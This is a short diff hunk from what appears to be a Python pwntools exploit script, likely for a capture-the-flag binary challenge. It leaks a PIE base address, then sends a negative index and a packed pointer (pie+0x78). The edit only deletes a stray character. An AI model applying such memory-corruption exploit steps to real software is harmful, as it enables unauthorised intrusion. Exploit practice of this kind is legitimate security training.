@@ -22,7 +22,7 @@ pie = u64(p.recv(6)+"\x00\x00")
 print 'pie : ' + hex(pie)
 
 go(4)
-go(-5)ㅊ
+go(-5)
 go(p64(pie+0x78)+"\n")
 
 go(4)
